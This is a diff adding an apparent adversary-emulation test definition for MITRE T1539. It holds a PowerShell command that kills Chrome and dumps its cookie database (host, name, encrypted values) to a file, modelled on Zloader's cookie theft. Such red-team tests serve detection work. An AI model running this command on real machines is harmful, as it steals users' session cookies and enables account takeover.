@@ -1,0 +1,27 @@
+---
+- id: 126aaf80c6a232eaf08dcef3163d4aed
+  name: Steal Chrome Cookies (Windows)
+  description: "This test queries Chrome's SQLite database to steal the encrypted\
+    \ cookie data, designed to function similarly to Zloader/Zbot's cookie theft function.\
+    \ \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt\
+    \ the encrypted value, potentially allowing for session theft. \nNote: If Chrome\
+    \ is running, the process will be killed to ensure that the DB file isn't locked.\
+    \ \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.\
+    \ \n"
+  tactic: credential-access
+  technique:
+    attack_id: T1539
+    name: Steal Web Session Cookie
+  platforms:
+    windows:
+      psh:
+        command: stop-process -name "chrome" -force -erroraction silentlycontinue;
+          "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly
+          from [Cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
+          "$env:localappdata\Google\Chrome\User Data\Default\Network\Cookies" | out-file
+          -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt"
+        payloads: []
+        cleanup: remove-item PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
